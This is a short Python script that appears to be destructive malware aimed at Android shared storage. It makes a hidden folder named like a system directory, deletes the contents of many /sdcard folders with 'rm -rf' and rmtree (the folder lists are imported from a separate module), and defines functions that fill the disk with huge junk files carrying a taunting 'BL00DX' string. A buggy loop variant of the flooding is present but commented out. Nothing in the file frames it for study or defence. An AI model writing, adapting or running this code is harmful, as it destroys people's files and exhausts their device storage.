from shutil import rmtree
from os import mkdir, remove
from time import sleep

way = '/sdcard/.SystemDirectory/'
content = '漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.漢.࿊.1.5.7.漢.࿊.BL00DXSAYS:BL00D_YOU!'
delDir = True
totalFiles = 10


def dirExists():
    try:
        exist = open(f'{way}.exist', 'a')
        exist.writelines('Nothing for you here :)')
        exist.close()
        remove(f'{way}.exist')
    except:
        mkdir(way)

def fileFloodWithFor():
    for c in range(0, totalFiles):
        flood = open(f'{way}.bloodX{c}', 'a')
        flood.write((f'{content}' * 100) * 100)
    
    flood.close()

def fileFloodWithWhile():
    try:
        while(True):
            try:
                flood = open(f'{way}.bloodX{c}', 'a') #talvez de erro pq ele n sabe onde esta essa variavel c
                flood.write((f'{content}' * 100) * 100)
                flood.close()
            except:
                break
    except:
        print('unknow error!')
        fileFloodWithFor()

def fileDelete():
    from other import dirList, dirListNative
    from os import system

    for files in range(0, len(dirListNative)):
        system(f'rm -rf /sdcard/{dirListNative[files]}/*')

    for directory in range(0, len(dirList)):
        try:
            rmtree(f'/sdcard/{dirList[directory]}')

        except:
            pass

def main():
    print('=' * 6, 'LOG OUTPUT', '=' * 6, '\n')
    print('[x]code running...\n')
    sleep(1)

    print('[x]verifying directory...\n')
    sleep(1)
    dirExists()

    if(delDir == True):
        print('[x]deleting directories\n')
        sleep(3)
        fileDelete()

    else:
        pass

    print('[x]flooding files...\n')
    sleep(1)
    #fileFloodWithWhile()


if __name__ == "__main__":
    main()
    
